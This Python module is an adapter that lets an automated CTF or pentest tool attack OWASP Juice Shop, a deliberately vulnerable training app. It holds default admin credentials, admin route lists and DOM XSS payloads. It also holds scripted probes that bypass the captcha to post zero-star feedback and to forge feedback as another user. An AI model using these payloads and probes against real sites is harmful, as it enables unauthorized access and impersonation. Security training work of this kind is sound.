"""
Juice Shop Platform Adapter — OWASP Juice Shop-specific CTF integration.

Extracts all Juice Shop-specific logic from the generic CTF coordinator:
  - Challenge tracking via /api/Challenges
  - Platform-specific credentials, API paths, and SPA routes
  - Challenge trigger probes (score-board, privacy-policy, etc.)
  - Captcha-based exploit probes (zero-stars, forged-feedback)
"""
import asyncio
import json
import re
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

import aiohttp

from backend.core.ctf_platforms.base import CTFPlatformAdapter, ChallengeInfo


class JuiceShopAdapter(CTFPlatformAdapter):
    """Platform adapter for OWASP Juice Shop."""

    platform_name = "juice_shop"

    # Juice Shop's 1-6 difficulty scale mapped to finding severity
    _DIFFICULTY_SEVERITY = {
        1: "info", 2: "low", 3: "medium", 4: "high", 5: "critical", 6: "critical",
    }

    # ------------------------------------------------------------------
    # Detection
    # ------------------------------------------------------------------

    async def detect(self, target: str, session: aiohttp.ClientSession) -> bool:
        """Detect Juice Shop by probing /api/Challenges."""
        try:
            url = f"{target.rstrip('/')}/api/Challenges"
            async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    challenges = data.get("data", [])
                    return isinstance(challenges, list) and len(challenges) > 0
        except Exception:
            pass
        return False

    # ------------------------------------------------------------------
    # Challenge tracking
    # ------------------------------------------------------------------

    async def poll_challenges(
        self, target: str, session: aiohttp.ClientSession
    ) -> Dict[Any, ChallengeInfo]:
        """Poll /api/Challenges for current challenge state."""
        try:
            url = f"{target.rstrip('/')}/api/Challenges"
            async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    challenges = data.get("data", [])
                    return {
                        c["id"]: ChallengeInfo(
                            challenge_id=c["id"],
                            name=c.get("name", f"Challenge #{c['id']}"),
                            category=c.get("category", "unknown"),
                            difficulty=c.get("difficulty", 0),
                            solved=c.get("solved", False),
                            max_difficulty=6,
                        )
                        for c in challenges
                    }
        except Exception:
            pass
        return {}

    def difficulty_to_severity(self, difficulty: int) -> str:
        return self._DIFFICULTY_SEVERITY.get(difficulty, "medium")

    # ------------------------------------------------------------------
    # Platform-specific content
    # ------------------------------------------------------------------

    def get_platform_credentials(self) -> List[Tuple[str, str]]:
        return [
            ("admin@juice-sh.op", "admin123"),
        ]

    def get_platform_login_paths(self) -> List[str]:
        return ["/rest/user/login"]

    def get_platform_api_paths(self) -> List[str]:
        return [
            "/api/Users", "/rest/admin/application-configuration",
            "/api/SecurityQuestions", "/api/SecurityAnswers",
            "/api/Feedbacks", "/api/Complaints",
            "/api/Recycles", "/api/Orders",
            "/api/Quantitys", "/api/Deliverys",
        ]

    def get_platform_hidden_paths(self) -> List[str]:
        return [
            "/#/score-board", "/#/administration", "/#/accounting",
            "/#/privacy-security/last-login-ip", "/#/order-history",
            "/#/recycle", "/#/complain", "/#/chatbot",
            "/#/privacy-policy", "/#/about", "/#/tokenSale",
            "/#/photo-wall", "/#/deluxe-membership", "/#/track-result",
            "/#/wallet", "/#/address/saved",
        ]

    def get_platform_search_paths(self) -> List[str]:
        return ["/rest/products/search"]

    def get_platform_field_names(self) -> Dict[str, List[str]]:
        return {
            "product_id": ["ProductId"],
            "basket_id": ["BasketId"],
            "user_id": ["UserId"],
            "feedback": ["api/Feedbacks"],
            "basket": ["rest/basket", "api/BasketItems"],
        }

    # ------------------------------------------------------------------
    # Platform-specific probes
    # ------------------------------------------------------------------

    async def run_platform_probes(
        self,
        session: aiohttp.ClientSession,
        target: str,
        auth_headers: Dict[str, str],
        log_callback: Callable,
        recon_data: Any = None,
    ) -> List[Dict]:
        """Run Juice Shop-specific exploit probes (captcha-based challenges)."""
        findings = []
        base = target.rstrip("/")

        # Only run these if we have auth (captcha probes require a session)
        if not auth_headers:
            return findings

        probes = [
            self._probe_zero_stars(session, base, log_callback),
            self._probe_forged_feedback(session, base, log_callback),
        ]
        results = await asyncio.gather(*probes, return_exceptions=True)
        for result in results:
            if isinstance(result, Exception):
                continue
            if result:
                findings.append(result)
        return findings

    async def run_platform_browser_probes(
        self,
        validator: Any,
        target: str,
        log_callback: Callable,
    ) -> List[Dict]:
        """Visit Juice Shop SPA routes that trigger challenge solves."""
        base = target.rstrip("/")

        challenge_routes = [
            (f"{base}/#/score-board", 3, "Score Board"),
            (f"{base}/#/privacy-security/privacy-policy", 3, "Privacy Policy"),
            (f"{base}/#/photo-wall", 2, "Photo Wall"),
            (f"{base}/#/deluxe-membership", 2, "Deluxe Membership"),
            (f"{base}/#/track-result", 2, "Track Result"),
            (f"{base}/#/accounting", 2, "Accounting"),
        ]

        xss_payloads = [
            (f'{base}/#/search?q=<iframe src="javascript:alert(`xss`)">', 4, "DOM XSS (iframe)"),
            (f'{base}/#/search?q=<img src=x onerror=alert(`xss`)>', 3, "DOM XSS (img)"),
        ]

        context = await validator.browser.new_context(
            ignore_https_errors=True,
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
        )
        try:
            page = await context.new_page()
            await page.goto(base, wait_until="networkidle", timeout=15000)
            await asyncio.sleep(1)

            triggered = 0
            for url, wait_s, desc in challenge_routes + xss_payloads:
                try:
                    await page.goto(url, wait_until="networkidle", timeout=10000)
                    await asyncio.sleep(wait_s)
                    triggered += 1
                except Exception:
                    continue

            await log_callback("info", f"[BrowserProbe] Juice Shop challenge triggers: visited {triggered} routes")
        except Exception as e:
            await log_callback("debug", f"[BrowserProbe] Juice Shop challenge trigger error: {e}")
        finally:
            await context.close()

        return []  # Findings come via challenge polling, not directly from navigation

    # ------------------------------------------------------------------
    # Captcha helper
    # ------------------------------------------------------------------

    @staticmethod
    def _solve_math_captcha(captcha_text: str) -> Optional[int]:
        """Solve Juice Shop's math captcha (format: 'X op Y' where op is +, -, *)."""
        match = re.search(r'(\d+)\s*([+\-*])\s*(\d+)', captcha_text)
        if not match:
            return None
        a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
        if op == '+':
            return a + b
        elif op == '-':
            return a - b
        elif op == '*':
            return a * b
        return None

    # ------------------------------------------------------------------
    # Juice Shop-specific probes
    # ------------------------------------------------------------------

    async def _probe_zero_stars(
        self, session: aiohttp.ClientSession, base: str, log_callback: Callable
    ) -> Optional[Dict]:
        """Submit feedback with rating=0 (Zero Stars challenge)."""
        try:
            async with session.get(f"{base}/rest/captcha/", ssl=False) as resp:
                if resp.status != 200:
                    return None
                captcha_data = await resp.json()
                captcha_id = captcha_data.get("captchaId")
                captcha_text = captcha_data.get("captcha", "")

            if not captcha_id or not captcha_text:
                return None

            captcha_answer = self._solve_math_captcha(captcha_text)
            if captcha_answer is None:
                return None

            payload = {
                "UserId": 1,
                "captchaId": captcha_id,
                "captcha": str(captcha_answer),
                "comment": "test (***anonymous***)",
                "rating": 0,
            }
            async with session.post(f"{base}/api/Feedbacks/", json=payload, ssl=False) as resp:
                if resp.status in (200, 201):
                    body = await resp.text()
                    data = json.loads(body)
                    if data.get("data", {}).get("id"):
                        await log_callback("warning", "[JuiceShop] Zero Stars: feedback with rating=0 accepted")
                        return _make_platform_finding(
                            "Zero Stars - Business Logic Bypass", "business_logic", "medium",
                            f"{base}/api/Feedbacks/", "rating", "0",
                            "Submitted feedback with rating=0 (bypasses 1-5 range)", "POST",
                        )
        except Exception:
            pass
        return None

    async def _probe_forged_feedback(
        self, session: aiohttp.ClientSession, base: str, log_callback: Callable
    ) -> Optional[Dict]:
        """Submit feedback as a different user (Forged Feedback challenge)."""
        try:
            async with session.get(f"{base}/rest/captcha/", ssl=False) as resp:
                if resp.status != 200:
                    return None
                captcha_data = await resp.json()
                captcha_id = captcha_data.get("captchaId")
                captcha_text = captcha_data.get("captcha", "")

            if not captcha_id or not captcha_text:
                return None

            captcha_answer = self._solve_math_captcha(captcha_text)
            if captcha_answer is None:
                return None

            payload = {
                "UserId": 2,
                "captchaId": captcha_id,
                "captcha": str(captcha_answer),
                "comment": "forged feedback test (***anonymous***)",
                "rating": 3,
            }
            async with session.post(f"{base}/api/Feedbacks/", json=payload, ssl=False) as resp:
                if resp.status in (200, 201):
                    body = await resp.text()
                    data = json.loads(body)
                    result = data.get("data", {})
                    if result.get("id") and result.get("UserId") == 2:
                        await log_callback("warning", "[JuiceShop] Forged Feedback: posted as UserId=2")
                        return _make_platform_finding(
                            "Forged Feedback - User Impersonation", "broken_access_control", "high",
                            f"{base}/api/Feedbacks/", "UserId", "2",
                            "Submitted feedback as a different user by manipulating UserId", "POST",
                        )
        except Exception:
            pass
        return None


def _make_platform_finding(
    title: str, vuln_type: str, severity: str,
    url: str, parameter: str, payload: str,
    evidence: str, method: str = "GET",
) -> Dict:
    """Create a standardized finding dict for platform-specific probes."""
    return {
        "title": title,
        "vulnerability_type": vuln_type,
        "severity": severity,
        "affected_endpoint": url,
        "parameter": parameter,
        "payload": payload,
        "evidence": evidence,
        "request_method": method,
        "agent_label": "PlatformProbe",
        "cvss_score": {"critical": 9.8, "high": 7.5, "medium": 5.0, "low": 3.0, "info": 0.0}.get(severity, 5.0),
        "cwe_id": "",
        "description": evidence,
        "impact": f"{severity.title()} severity {vuln_type} vulnerability",
        "remediation": f"Fix {vuln_type} vulnerability",
        "references": [],
    }
